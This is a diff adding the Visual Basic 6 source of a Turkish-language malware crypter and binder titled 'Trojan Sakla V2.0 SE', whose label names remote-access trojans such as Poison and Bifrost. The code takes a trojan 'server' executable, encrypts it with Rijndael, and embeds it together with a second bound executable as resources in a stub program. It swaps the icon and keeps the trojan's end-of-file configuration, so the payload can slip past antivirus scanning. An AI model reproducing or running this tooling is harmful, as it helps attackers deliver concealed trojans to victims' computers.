@@ -1,0 +1,367 @@
+VERSION 5.00
+Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "comdlg32.ocx"
+Begin VB.Form Form1 
+   BackColor       =   &H00808080&
+   BorderStyle     =   1  'Fixed Single
+   Caption         =   "Trojan Sakla V2.0 SE"
+   ClientHeight    =   3690
+   ClientLeft      =   45
+   ClientTop       =   435
+   ClientWidth     =   4755
+   BeginProperty Font 
+      Name            =   "Tahoma"
+      Size            =   8.25
+      Charset         =   162
+      Weight          =   400
+      Underline       =   0   'False
+      Italic          =   0   'False
+      Strikethrough   =   0   'False
+   EndProperty
+   ForeColor       =   &H80000001&
+   Icon            =   "Form1.frx":0000
+   LinkTopic       =   "Form1"
+   MaxButton       =   0   'False
+   ScaleHeight     =   3690
+   ScaleWidth      =   4755
+   StartUpPosition =   2  'CenterScreen
+   Begin VB.CommandButton Command1 
+      Caption         =   "Hakkýnda"
+      Height          =   315
+      Left            =   1560
+      TabIndex        =   13
+      Top             =   2880
+      Width           =   1215
+   End
+   Begin VB.TextBox txtBind 
+      Height          =   285
+      Left            =   120
+      TabIndex        =   9
+      Top             =   1800
+      Width           =   2655
+   End
+   Begin VB.CommandButton Cmd 
+      Caption         =   "..."
+      Height          =   285
+      Index           =   4
+      Left            =   3360
+      TabIndex        =   8
+      Top             =   1800
+      Width           =   1215
+   End
+   Begin VB.CommandButton Cmd 
+      Caption         =   "Icon"
+      Height          =   285
+      Index           =   2
+      Left            =   3360
+      TabIndex        =   7
+      Top             =   2880
+      Width           =   1215
+   End
+   Begin VB.TextBox txtIcon 
+      Height          =   285
+      Left            =   360
+      TabIndex        =   6
+      Top             =   4200
+      Width           =   1335
+   End
+   Begin VB.CommandButton Cmd 
+      Caption         =   "Crypt"
+      Height          =   285
+      Index           =   3
+      Left            =   3360
+      TabIndex        =   5
+      Top             =   3360
+      Width           =   1215
+   End
+   Begin VB.CheckBox ChkEOF 
+      BackColor       =   &H00808080&
+      Caption         =   "EOF"
+      ForeColor       =   &H0000FFFF&
+      Height          =   285
+      Left            =   120
+      TabIndex        =   4
+      Top             =   2880
+      Value           =   1  'Checked
+      Width           =   615
+   End
+   Begin VB.CommandButton Cmd 
+      Caption         =   "Rasgele"
+      Height          =   285
+      Index           =   1
+      Left            =   3360
+      TabIndex        =   3
+      Top             =   2400
+      Width           =   1215
+   End
+   Begin VB.TextBox txtKey 
+      Height          =   285
+      Left            =   120
+      TabIndex        =   2
+      Top             =   2400
+      Width           =   2655
+   End
+   Begin VB.CommandButton Cmd 
+      Caption         =   "..."
+      Height          =   285
+      Index           =   0
+      Left            =   3360
+      TabIndex        =   1
+      Top             =   1200
+      Width           =   1215
+   End
+   Begin VB.TextBox txtFile 
+      Height          =   285
+      Left            =   120
+      TabIndex        =   0
+      Top             =   1200
+      Width           =   2655
+   End
+   Begin MSComDlg.CommonDialog CD1 
+      Left            =   960
+      Top             =   3840
+      _ExtentX        =   847
+      _ExtentY        =   847
+      _Version        =   393216
+   End
+   Begin VB.Label Label1 
+      BackColor       =   &H00808080&
+      Caption         =   "Poison,Bifrost,Painrat,Spy-net,Flux..."
+      BeginProperty Font 
+         Name            =   "Tahoma"
+         Size            =   8.25
+         Charset         =   162
+         Weight          =   700
+         Underline       =   0   'False
+         Italic          =   0   'False
+         Strikethrough   =   0   'False
+      EndProperty
+      ForeColor       =   &H00FFFFFF&
+      Height          =   255
+      Index           =   3
+      Left            =   120
+      TabIndex        =   14
+      Top             =   3360
+      Width           =   3135
+   End
+   Begin VB.Label Label1 
+      BackColor       =   &H00808080&
+      Caption         =   "Sifre"
+      ForeColor       =   &H00000000&
+      Height          =   255
+      Index           =   2
+      Left            =   240
+      TabIndex        =   12
+      Top             =   2160
+      Width           =   1935
+   End
+   Begin VB.Label Label1 
+      BackColor       =   &H00808080&
+      Caption         =   "Binder Dosya"
+      ForeColor       =   &H00000000&
+      Height          =   255
+      Index           =   1
+      Left            =   240
+      TabIndex        =   11
+      Top             =   1560
+      Width           =   1935
+   End
+   Begin VB.Label Label1 
+      BackColor       =   &H00808080&
+      Caption         =   "Server Dosya"
+      ForeColor       =   &H00000000&
+      Height          =   255
+      Index           =   0
+      Left            =   240
+      TabIndex        =   10
+      Top             =   960
+      Width           =   1935
+   End
+End
+Attribute VB_Name = "Form1"
+Attribute VB_GlobalNameSpace = False
+Attribute VB_Creatable = False
+Attribute VB_PredeclaredId = True
+Attribute VB_Exposed = False
+Private Declare Function CopyFile Lib "kernel32" Alias "CopyFileA" (ByVal lpExistingFileName As String, ByVal lpNewFileName As String, ByVal bFailIfExists As Long) As Long
+Private oTest As CRijndael
+
+Private Sub Cmd_Click(Index As Integer)
+Select Case Index
+Case 0
+CD1.CancelError = False
+CD1.Filter = "EXE|*.EXE"
+CD1.ShowOpen
+If CD1.FileName = Empty Then Exit Sub
+txtFile = CD1.FileName
+CD1.FileName = Empty
+
+Case 1
+GetRandomKey
+
+Case 2
+CD1.CancelError = False
+CD1.Filter = "ICO|*.ICO"
+CD1.ShowOpen
+If CD1.FileName = Empty Then Exit Sub
+txtIcon = CD1.FileName
+CD1.FileName = Empty
+
+Case 3
+Dim nereye As String, sifrelendi As String
+CD1.CancelError = False
+CD1.Filter = "EXE|*.EXE"
+CD1.ShowSave
+If CD1.FileName = Empty Then Exit Sub
+nereye = CD1.FileName
+CD1.FileName = Empty
+
+CopyFile App.Path & "\tools\stub.exe", nereye, 0
+sifrelendi = strEncrypt(LoadFile(txtFile), txtKey)
+Open App.Path & "\Crypting" For Binary As #1
+Put #1, , sifrelendi
+Close #1
+
+sifrelendi = strEncrypt(LoadFile(txtBind), txtKey)
+Open App.Path & "\Binding" For Binary As #1
+Put #1, , sifrelendi
+Close #1
+
+Open App.Path & "\Settings" For Binary As #1
+Put #1, , txtKey.Text
+Close #1
+ResEkle nereye, App.Path & "\Crypting", "INFO", "FILE"
+ResEkle nereye, App.Path & "\Binding", "INFO", "BFILE"
+ResEkle nereye, App.Path & "\Settings", "INFO", "SETTINGS"
+Kill App.Path & "\Crypting"
+Kill App.Path & "\Binding"
+Kill App.Path & "\Settings"
+If txtIcon <> vbNullString Then IconDegistir nereye, txtIcon
+If ChkEOF.Value = 1 And ReadEOFData(txtFile) <> vbNullString Then
+WriteEOFData nereye, ReadEOFData(txtFile)
+End If
+
+MsgBox "Basarili"
+Case 4
+CD1.CancelError = False
+CD1.Filter = "EXE|*.EXE"
+CD1.ShowOpen
+If CD1.FileName = Empty Then Exit Sub
+txtBind = CD1.FileName
+CD1.FileName = Empty
+
+End Select
+End Sub
+
+Private Sub Command1_Click()
+Form4.Show
+End Sub
+
+Private Sub Form_Load()
+GetRandomKey
+End Sub
+
+Private Function IconDegistir(Dosya As String, Icon As String)
+Call Shell(App.Path & "\tools\ResHacker.exe -addoverwrite " & Dosya & Chr(44) & Dosya & Chr(44) & Icon & Chr(44) & "ICONGROUP,1,0")
+End Function
+
+Private Function ResEkle(File As String, Res As String, ResType As String, ResID As String)
+Call Shell(App.Path & "\tools\ResHacker.exe -addoverwrite " & File & Chr(44) & File & Chr(44) & Res & Chr(44) & ResType & Chr(44) & ResID & Chr(44) & "0")
+End Function
+
+Private Function strEncrypt(ByVal strMsg As String, ByVal pKey As String) As String
+Dim ByteArray() As Byte, byteKey() As Byte, CryptText() As Byte
+On Local Error Resume Next
+Set oTest = New CRijndael
+ByteArray() = StrConv(strMsg, vbFromUnicode)
+byteKey() = StrConv(pKey, vbFromUnicode)
+CryptText() = oTest.EncryptData(ByteArray(), byteKey())
+Set oTest = Nothing
+strEncrypt = StrConv(CryptText(), vbUnicode)
+End Function
+
+Private Function RandomNumber() As Integer
+    Randomize
+    var1 = Int(9 * Rnd)
+    RandomNumber = var1
+End Function
+
+Private Function RandomLetter() As String
+Anfang:
+    Keyset = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+    Randomize
+    var1 = Int(26 * Rnd)
+    If var1 = 0 Then GoTo Anfang
+    RandomLetter = Mid(Keyset, var1, 1)
+End Function
+
+Private Function GetRandomKey()
+Dim i As Long
+    txtKey = ""
+    For i = 1 To 20
+        If i = 2 Or i = 4 Or i = 6 Then
+            txtKey = txtKey & RandomNumber
+        Else
+            txtKey = txtKey & RandomLetter
+        End If
+    Next i
+End Function
+
+Private Function LoadFile(sPath As String) As String
+    Dim lFileSize As Long
+    Dim sData As String
+    Dim FF As Integer
+    FF = FreeFile
+    On Error Resume Next
+    Open sPath For Binary Access Read As #FF
+    lFileSize = LOF(FF)
+    sData = Input$(lFileSize, FF)
+    Close #FF
+    LoadFile = sData
+End Function
+
+Public Function ReadEOFData(sFilePath As String) As String
+On Error GoTo Err:
+Dim sFileBuf As String, sEOFBuf As String, sChar As String
+Dim lFF As Long, lPos As Long, lPos2 As Long, lCount As Long
+If Dir(sFilePath) = "" Then GoTo Err:
+lFF = FreeFile
+Open sFilePath For Binary As #lFF
+sFileBuf = Space(LOF(lFF))
+Get #lFF, , sFileBuf
+Close #lFF
+lPos = InStr(1, StrReverse(sFileBuf), GetNullBytes(30))
+sEOFBuf = (Mid(StrReverse(sFileBuf), 1, lPos - 1))
+ReadEOFData = StrReverse(sEOFBuf)
+If ReadEOFData = "" Then
+End If
+Exit Function
+Err:
+ReadEOFData = vbNullString
+End Function
+
+Sub WriteEOFData(sFilePath As String, sEOFData As String)
+Dim sFileBuf As String
+Dim lFF As Long
+On Error Resume Next
+If Dir(sFilePath) = "" Then Exit Sub
+lFF = FreeFile
+Open sFilePath For Binary As #lFF
+sFileBuf = Space(LOF(lFF))
+Get #lFF, , sFileBuf
+Close #lFF
+Kill sFilePath
+lFF = FreeFile
+Open sFilePath For Binary As #lFF
+Put #lFF, , sFileBuf & sEOFData
+Close #lFF
+End Sub
+
+Public Function GetNullBytes(lNum) As String
+Dim sBuf As String
+Dim i As Integer
+For i = 1 To lNum
+sBuf = sBuf & Chr(0)
+Next
+GetNullBytes = sBuf
+End Function
+
